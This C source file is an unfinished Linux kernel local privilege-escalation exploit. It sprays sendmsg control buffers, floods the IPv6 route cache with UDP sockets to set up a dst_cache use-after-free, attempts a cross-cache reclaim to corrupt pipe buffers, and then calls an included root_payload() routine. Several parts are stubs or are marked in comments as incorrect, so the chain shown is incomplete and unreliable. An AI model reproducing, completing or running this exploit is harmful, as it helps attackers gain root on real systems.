#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <string.h>
#include <assert.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <root_payload.h>

typedef uint64_t u64;
typedef int64_t i64;
typedef uint32_t u32;
typedef int32_t i32;
typedef uint16_t u16;
typedef int16_t i16;
typedef uint8_t u8;
typedef int8_t i8;

typedef size_t usize;

#define LOG(fmt, ...) do { \
    printf(fmt "\n", ##__VA_ARGS__); \
} while(0)

#define SYSCHK(x) ({                  \
    __typeof__(x) __res = (x);          \
    if (__res == (__typeof__(x))-1) {   \
        LOG("SYSCHK(" #x ") = %d\n", __res);\
        int error_val = errno;            \
        LOG("errno: %d\n", error_val);    \
        exit(1);                          \
    }                                   \
    __res;                              \
})

#define CHECK(x, n) ({                  \
    __typeof__(x) __res = (x);          \
    if (__res != n) {   \
        LOG("SYSCHK(" #x ") = %d\n", __res);\
        int error_val = errno;            \
        LOG("errno: %d\n", error_val);    \
        exit(1);                          \
    }                                   \
    __res;                              \
})

int pin_to_cpu(int cpu) {
    int rc;
    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    cpu_set_t *cpu_setp = CPU_ALLOC(num_cpus);
    size_t size = CPU_ALLOC_SIZE(num_cpus);
    CPU_ZERO_S(size, cpu_setp);
    if (cpu >= 0 && cpu < num_cpus) {
        CPU_SET_S(cpu, size, cpu_setp);
    } else {
        for (int i = 0; i < num_cpus; i++) {
            CPU_SET_S(i, size, cpu_setp);
        }
    }

    rc = sched_setaffinity(0, size, cpu_setp);
    // if (rc) {
    //     printf("cpu %d failed to be pinned (num cpus = %d)\n", cpu, num_cpus);
    //     perror("sched_setaffinity");
    // }
    CPU_FREE(cpu_setp);
    return rc;
}

void panic(const char *msg) {
    puts(msg);
    exit(1);
}

typedef struct {
    int read_fd;
    int write_fd;
} Pipe;

Pipe open_pipe() {
    int fds[2] = { 0 };
    SYSCHK(pipe(fds));
    Pipe pipe = {
        .read_fd = fds[0],
        .write_fd = fds[1],
    };
    return pipe;
}

void pipe_set_buf_size(Pipe *pipe, usize size) {
    CHECK(fcntl(pipe->write_fd, F_SETPIPE_SZ, size), size);
}

void pipe_prefault(Pipe *pipe) {
    u8 buf = 0;
    SYSCHK(write(pipe->write_fd, &buf, sizeof(buf)));
    CHECK(read(pipe->write_fd, &buf, sizeof(buf)), sizeof(buf));
}

#define NUM_SPRAY 0x400
#define SPRAY_SIZE 0x100

// sendmsg spray adapted from CVE-2023-3609 exploit
// payload to send on socket
u8 dummy_buf[0x1000] = { 0 };

// payload sprayed to overlap with
u8 payload[SPRAY_SIZE] = { 0 };

int control_socket[2] = { 0 };
int spray_sockets[NUM_SPRAY][2] = { 0 };


void *spray_thread(void *x) {
    size_t index = (size_t)x;
    write(control_socket[0], dummy_buf, 1);
    read(control_socket[0], dummy_buf, 1);
    pin_to_cpu(0);

    struct iovec iov = {
        .iov_base = dummy_buf,
        .iov_len = sizeof(dummy_buf),
    };

    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = payload,
        .msg_controllen = sizeof(payload),
    };

    sendmsg(spray_sockets[index][1], &msg, 0);

    // we only spray once for now, and never exit
    for (;;) {
        sleep(1000);
    }

    return NULL;
}

void setup_spray() {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, control_socket));

    memset(payload, 0, sizeof(payload));
    memset(dummy_buf, 0, sizeof(dummy_buf));

    struct cmsghdr *control_header = (struct cmsghdr *) &payload[0];
    control_header->cmsg_len = sizeof(payload);
    control_header->cmsg_level = 0;
    control_header->cmsg_type = 0;

    for (usize i = 0; i < NUM_SPRAY; i++) {
        SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, spray_sockets[i]));

        u32 buf_size = 0x800;
        SYSCHK(setsockopt(spray_sockets[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&buf_size, sizeof(buf_size)));
        SYSCHK(setsockopt(spray_sockets[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&buf_size, sizeof(buf_size)));
        write(spray_sockets[i][1], dummy_buf, sizeof(dummy_buf));
    }

    pthread_t tid = 0;
    for (usize i = 0; i < NUM_SPRAY; i++) {
        pthread_create(&tid, 0, spray_thread, (void *)i);
        pthread_detach(tid);
    }

    // wait for threads to get setup
    int to_read = NUM_SPRAY;
    while (to_read > 0) {
        to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
    }
}

void do_spray() {
    write(control_socket[1], dummy_buf, NUM_SPRAY);
    // wait for spray to finish
    // cant really use barrier cause threads will indefinately block in sendmsg
    // so they can't signal after they are done
    sleep(1);
}

// cleans up resrouces used during spray
void reset_spray() {
    for (usize i = 0; i < NUM_SPRAY; i++) {
        read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf));
        // SYSCHK(close(spray_sockets[i][0]));
        // SYSCHK(close(spray_sockets[i][1]));
    }

    // SYSCHK(close(control_socket[0]));
    // SYSCHK(close(control_socket[1]));
}

int open_connected_ipv6_udp_socket() {
    int socket_fd = SYSCHK(socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP));

    struct sockaddr_in6 addr = { 0 };
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons(1337);
    SYSCHK(inet_pton(AF_INET6, "::1", &addr.sin6_addr));

    SYSCHK(connect(socket_fd, (struct sockaddr*)&addr, sizeof(addr)));

    return socket_fd;
}

void open_many_sockets(int *fd_array, usize len) {
    for (usize i = 0; i < len; i++) {
        fd_array[i] = open_connected_ipv6_udp_socket();
    }
}

void close_fds(int *fd_array, usize len) {
    for (usize i = 0; i < len; i++) {
        SYSCHK(close(fd_array[i]));
    }
}

void *trigger_vuln_dst_cache_free(void *arg) {
    int write_fd = (int) (usize) arg;
    pin_to_cpu(1);

    return NULL;
}

void *preempt_free_thread(void *arg) {
    int read_fd = (int) (usize) arg;
    pin_to_cpu(1);

    // TODO: set priority
    u8 buf = 0;

    SYSCHK(read(read_fd, &buf, sizeof(buf)));

    // spin indefinately (nut ub apparently if constant expression)
    // cannot sleep I think, then other thread may wake up
    for (;;) {}

    return NULL;
}

void trigger_vuln(int socket_fd) {
    pthread_t trigger_thread = { 0 };
    pthread_t block_thread = { 0 };

    int preempt_pipes[2] = { 0 };
    SYSCHK(pipe(preempt_pipes));

    SYSCHK(pthread_create(&block_thread, NULL, preempt_free_thread, (void *) (usize) preempt_pipes[0]));
    // wait for thread to read from pipe
    sleep(1);
}

#define NUM_PAGE_PIPES 0x600
#define NUM_VULN_PIPES 0x20
#define NUM_PRE_SOCKETS 1024
#define NUM_POST_SOCKETS 1024

void exploit() {
    Pipe page_pipes[NUM_PAGE_PIPES] = { 0 };
    Pipe vuln_pipes[NUM_VULN_PIPES] = { 0 };

    setup_spray();

    // setup page pipes to have 1 pipe buffer entry with 1 backing page, but don't prefault
    for (usize i = 0; i < NUM_PAGE_PIPES; i++) {
        page_pipes[i] = open_pipe();
        pipe_set_buf_size(&page_pipes[i], 0x1000);
    }

    // initially put vuln pipes in smaller cache
    for (usize i = 0; i < NUM_VULN_PIPES; i++) {
        vuln_pipes[i] = open_pipe();
        pipe_set_buf_size(&vuln_pipes[i], 0x1000);
        pipe_prefault(&vuln_pipes[i]);

        // not sure if this write is needed
        // just copied from bad io uring structure
        u8 buf = 0;
        write(vuln_pipes[i].write_fd, &buf, sizeof(buf));
    }

    // first spray any sockets, to fill rt6_info kmalloc cache
    // TODO: tune these values for cross cache attack
    int sockets_pre_spray[NUM_PRE_SOCKETS] = { 0 };
    int sockets_post_spray[NUM_POST_SOCKETS] = { 0 };

    open_many_sockets(sockets_pre_spray, NUM_PRE_SOCKETS);
    int vuln_fd = open_connected_ipv6_udp_socket();
    open_many_sockets(sockets_post_spray, NUM_POST_SOCKETS);

    // TODO: trigger_vuln is not correct rn
    // assume it results in this sockets dst_cache being freed, still having a valid pointer, but socket lock is held
    trigger_vuln(vuln_fd);

    // close many sockets, hopefully buddy allocator reclaims backing page
    close_fds(sockets_pre_spray, NUM_PRE_SOCKETS);
    close_fds(sockets_post_spray, NUM_POST_SOCKETS);

    // TODO: setup payload we want to spray
    // after spray, dst_cache hopefully reclaimed
    do_spray();

    // now write/send should trigger 'invalid' dst_cache route to be released
    u8 buf = 0;
    SYSCHK(write(vuln_fd, &buf, sizeof(buf)));

    // change vuln pipe buffer to put them in kmalloc-256
    // will hopefully cause pipe to fill freed slot in sprayed object
    for (usize i = 0; i < NUM_VULN_PIPES; i++) {
        pipe_set_buf_size(&vuln_pipes[i], 4 * 0x1000);
    }

    // trigger all sprayed objects to be freed
    // will trigger a page with vuln pipe to be freed
    reset_spray();

    // attempt to reclaim vuln pipe with another pipe backing page
    u8 buf2[0x1000] = { 0 };
    memset(buf2, 'A', sizeof(buf2));
    for (usize i = 0; i < NUM_PAGE_PIPES; i++) {
        write(page_pipes[i].write_fd, buf2, sizeof(buf2));
    }

    // find corrupted pipe
    int bad_index = -1;
    for (int i = 0; i < NUM_VULN_PIPES; i++) {
        int size = 0;
        ioctl(vuln_pipes[i].write_fd, FIONREAD, &size);
        if (size == 0x41414141) {
            bad_index = i;
            break;
        }
    }

    if (bad_index == -1) {
        LOG("FAIL: could not corrupt pipe");
        getchar();
        return;
    }

    Pipe exp_pipe = vuln_pipes[bad_index];
}

int main() {
    puts("Starting exploit...");

    pin_to_cpu(0);

    exploit();

    root_payload();

    while (1) {
        sleep(1000);
    }
}
